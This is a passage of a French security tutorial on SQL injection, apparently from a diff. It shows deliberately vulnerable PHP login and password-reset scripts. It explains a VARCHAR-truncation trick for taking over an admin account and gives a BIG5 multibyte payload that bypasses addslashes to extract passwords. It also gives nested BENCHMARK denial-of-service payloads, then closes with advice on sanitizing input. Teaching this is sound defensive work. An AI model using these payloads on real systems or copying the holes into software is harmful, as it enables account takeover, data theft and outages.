+    Si vous assignez une chaîne de caractères qui dépasse la capacité de la colonne CHAR ou VARCHAR, celle ci est tronquée jusqu'à la taille maximale du champ.
+
+    Et d'un autre coté on voit que pour le type CHAR :
+
+    Quand une valeur de CHAR est lue, les espaces en trop sont retirés
+
+    et pour le type VARCHAR :
+
+    les espaces finaux sont supprimés avant stockage.
+
+    Donc, lors de l'enregistrement d'un VARCHAR, si on soumet une chaîne de caractères suivit d'un grand nombre d'espaces (assez pour dépasser la taille de notre VARCHAR) puis d'autres caractères lambda, ces derniers caractères seront tronqués et les espaces retirés. Nous allons voir ici que cela peut conduire à des vulnérabilités qui dépendront de la manière dont est codé le script interrogeant la base de données. Voyons tout de suite un exemple : un système de "pass perdu" qui envoie un mail à un membre lui donnant un lien permettant de réinitialiser son mot de passe.
+
+    Le premier fichier est inscription.php, et permet de d'enregistrer un utilisateur avec un login, un pass et une adresse mail :
+
+    <?php
+    if(mysql_num_rows(mysql_query("SELECT * FROM users WHERE login='".mysql_real_escape_string($_GET['login'])."'")) != 0)
+    	echo 'Un utilisateur existe déjà avec ce login.';
+    else
+    {
+    	mysql_query("INSERT INTO users (login, pass, mail)
+    	VALUES ('".mysql_real_escape_string($_GET['login'])."',
+    	'".mysql_real_escape_string($_GET['pseudo'])."',
+    	'".mysql_real_escape_string($_GET['mail'])."'");
+    	echo 'Vous êtes maintenant enregistré.'
+    }
+    ?>
+
+    Ce fichier vérifie s'il n'existe pas déjà un utilisateur avec le login donné, mais nous allons voir que l'implémentation n'est pas suffisante. Le fichier suivant est passperdu.php et permet de demander une réinitialisation de mot de passe en fournissant l'email donné lors de l'inscription :
+
+    <?php
+    $sql = mysql_query("SELECT login FROM users WHERE mail = '".mysql_real_escape_string($_GET['mail'])."'");
+    if(mysql_num_rows($sql) == 0)
+    	echo 'Le mail est incorrect.';
+    else
+    {
+    	$data = mysql_fetch_array($sql);
+    	$activationKey = randomString();
+    	$activationLink = 'http://site.com/nouveaupass.php?login='.$data['login'].'&key='.$activationKey;
+    	SendMailLostPass($_GET['mail'], $activationLink);
+    	mysql_query("INSERT INTO passperdu (login, key) VALUES ('".mysql_real_escape_string($data['login'])."', '".mysql_real_
+    	escape_string($activationKey)."')");
+    	echo 'Un email vous a été envoyé pour réinitialiser votre password';
+    }
+    ?>
+
+    Enfin, le dernier fichier est nouveaupass.php et permet d'obtenir un nouveau password. C'est sur ce fichier que pointe le lien envoyé par email.
+
+    <?php
+    if(mysql_num_rows(mysql_query("SELECT * FROMpassperdu WHERE login='".mysql_real_escape_string($_GET['login'])."' AND 
+    key='".mysql_real_escape_string($_GET['key'])."'")) != 1)
+    	echo 'Erreur';
+    else
+    {
+    	$newPass = randomString();
+    	mysql_query("UPDATE users SET pass='".$newPass."' WHERE
+    	login='".mysql_real_escape_string($_GET['login'])."'");
+    	echo 'Votre nouveau pass est '.$newPass;
+    }
+    ?>
+
+    Posons nous maintenant la question : comment obtenir un nouveau mot de passe pour le compte ayant le login "administrateur" ? Nous savons que le Varchar qui stocke le login est limité à 20 caractères, donc que tout ce qui dépasse sera tronqué, et que les espaces finaux seront supprimés.
+
+    Ainsi, en fournissant la chaîne "administrateur azerty", l'inscription se fera finalement avec le login "administrateur", car il sera tronqué à 20 caractères, soit "administrateur " et les espaces finaux seront supprimés.
+
+    Et on passera la vérification du login, car étant limités à 20 caractères, aucun pseudo ne peut être égal à "administrateur azerty". On créera donc un second compte avec le login administrateur. La suite de l'exploitation se fait simplement : il suffit de fournir notre adresse email à passperdu, pour qu'il nous fournisse un lien pour réinitialiser le pass du compte "administrateur", nouveaupass.php se chargera ensuite de changer le pass de ce compte, sans tenir compte du fait qu'il en existe plusieurs : il changera le pass pour les deux... Il ne faut donc pas négliger la taille des données entrantes.
+
+    3.5 - Charset & contournement de l'échappement
+
+    Cette partie aurait aussi bien pu s'appeler « Addslashes, Magic Quotes et Mysql_Escape_String contre Mysql_Real_Escape_String ». Pourquoi ? Car d'un coté nous avons les fonctions qui ne tiennent pas compte du jeu de caractère utilisé par MySQL pour échapper les données, et de l'autre coté nous avons mysql_real_escape_string, qui en tient compte.
+
+    Dans cette partie nous verrons donc comment l'utilisation de « charset multibytes » (ou « jeu de caractères multi-octets » en français) comme BIG5 ou GBK (jeu de caractères chinois) peut nous permettre de contourner l'échappement réalisé par ces premières fonctions.
+
+    Prenons par exemple la fonction addslashes, le jeu de caractères BIG5, et le script de login suivant :
+
+    <?php
+    $db = mysql_connect('localhost', 'root', '') or
+    die('Erreur de connection');
+    mysql_select_db('MaBase', $db) or die('Erreur de selection');
+    mysql_query("SET CHARACTER SET big5");
+    $pseudo = isset($_POST['pseudo']) ? addslashes($_
+    POST['pseudo']) : NULL;
+    if(($sql = mysql_query("SELECT * FROM membres WHERE pseudo='".$pseudo."'")) === FALSE)
+    echo 'Erreur SQL '.mysql_error();
+    else
+    if(mysql_num_rows($sql) != 1)
+    echo 'Ce membre n\'existe pas. '.mysql_num_rows($sql);
+    else
+    {
+    $data = mysql_fetch_array($sql);
+    echo 'Le membre ayant l\'id '.$data['id'].' est '.$data['pseudo'].' est s\'est connecté pour la dernière fois le '.$data['date'].'.';
+    }
+    ?>
+
+    La requête SET CHARACTER SET big5 précise le charset à utiliser à MySQL (ici c'est juste pour l'illustration de la faille), et on voit que la variable $pseudo est bien « sécurisée » avec addslashes. Le problème vient alors du fait que addslashes ne tient pas compte du fait que big5 utilise des caractères multi-octets comme par exemple ce caractère ? dont le code hexadécimal est 0xa25c. Effectivement, avec addslashes, les quotes (entre autres) dont le code hexadécimal est 0x27 seront précédés d'un anti-slash 0x5c. Donc, par exemple, si j'envoie la chaîne « ¢' », 0xa227 en hexadécimal, elle sera remplacé par addslashes par la chaîne 0xa25c27, et lorsque cette chaîne sera utilisée dans la requête SQL, étant donné que 0xa25c est un caractère valide dans le charset BIG5, MySQL l'interprétera comme une chaîne formée de deux caractères : notre caractère multi-octet et une quote !
+
+    Ainsi pour obtenir une injection SQL malgré addslashes il suffira d'envoyer « le caractère correspondant au premier octet d'un caractère multi-octet BIG5 » suivi d'une quote et de notre injection, par exemple : ¢' UNION SELECT password,1,1,1 FROM membres WHERE id=1#
+
+    3.6 - DoS MySQL
+
+    Un autre vecteur d'attaque des injections SQL, pourrait être d'injecter des données afin de faire effectuer au serveur cible des opérations lourdes qui pourraient conduire à un déni de service. L'intérêt à mes yeux de ce type d'attaque étant moindre, nous ne verrons qu'une brève introduction.
+
+    On a vu que la fonction BENCHMARK est très coûteuse en ressources, une injection des plus lourdes l'utiliserai donc de manière récursive :
+
+    UNION SELECT BENCHMARK(9999999999999999,
+    BENCHMARK(9999999999999999, BENCHMARK(9999999999999999,
+    BENCHMARK(9999999999999999, MD5(NOW())))))
+
+    On pourrait aussi saturer le disque dur en créant une multitude de lourds fichiers avec INTO OUTFILE. Ou encore empêche l'exécution d'une requête et lui faisant dépasser l'option max_packet_size, etc, etc...
+    4 - Sécurisation
+
+    Nous l'avons vu tout au long de cet article, les injections SQL peuvent s'avérer assez dangereuses, il devient donc essentiel de sécuriser les entrées de l'utilisateur avant de les utiliser dans une requête. On a également pu se rendre compte qu'échapper les caractères spéciaux comme les quotes ne suffit pas, puisqu'il est possible de réussir certaines injections sans les utiliser. Ainsi le meilleur moyen de sécurisation est de traiter les données entrantes au cas par cas, selon leur utilisation dans la requête.
+
+    Pour les valeurs numériques il convient de vérifier que la variable testée est bien un chiffre, la plupart du temps un entier positif, et qu'il ne dépasse pas une valeur maximale donnée. Les fonctions PHP is_numeric, is_int et intval pourrons nous être utiles.
+
+    Pour les chaînes de caractères un début pourrait être d'échapper les caractères spéciaux, mais il vaut mieux proscrire tous les caractères spéciaux, ou les caractères qui ne correspondent pas à l'information enregistrée : par exemple une quote, un null byte, ou un % n'ont strictement rien à faire là si l'information demandée est un prénom... Globalement, on pourra utiliser la fonction mysql_real_escape_ string qui échappe un jeu de caractères dangereux, mais plus particulièrement on pourra utiliser preg_replace avec une classe de caractères définissant les seuls caractères autorisés, pour supprimer tous les autres. Il est également important de contrôler la longueur de la chaîne.
+
+    Voici, à titre d'exemple, une fonction PHP qui permettrai de contrôler/sécuriser des entiers positifs et des chaînes de caractères alphanumériques. Bien entendu, à chacun sa propre méthode de sécurisation, qui dépend de l'usage.
+
+    <?php
+    function mysql_secure($data, $type, $max)
+    {
+    # $data : données à sécuriser
+    # $type : 'int' ou 'str'
+    # $max : la longueur maximum pour une chaine, la valeur maximale pour un nombre
+    # Valeur de retour : les données sécurisées où une valeur par défaut (0 ou NULL)
+    	switch($type)
+    	{
+    		case 'int':
+    		if(is_numeric($data) && is_int($data) && $data>=0 && $data<=$max)
+    			return $data;
+    		else
+    			return 0;
+    		break;
+    		case 'str':
+    		if(is_string($data))
+    			return preg_replace('#[^a-zA-Z0-9]#', NULL, substr($data, 0, $max));
+    		else
+    			return NULL;
+    		break;
+    		default:
+    		return NULL;
+    	}
+    }
+    ?>
+    Conclusion
+
+    C'est la fin de cet article, j'espère qu'il aura été instructif pour chacun =)
+
+    On peut simplement dire en guise de conclusion qu'à travers cet article nous avons pu voir que les différentes exploitations des injections SQL sont nombreuses et dangereuses, et qu'il ne s'agit par conséquent pas d'un type de faille qu'il faut négliger. Comme pour beaucoup d'aspects sécuritaires, il existe un besoin de sensibilisation des développeurs à ces dangers afin de pouvoir s'en affranchir.
+
+    Avant de terminer j'adresse mes remerciements à Geo, et bien sur à HZV =)
+
+
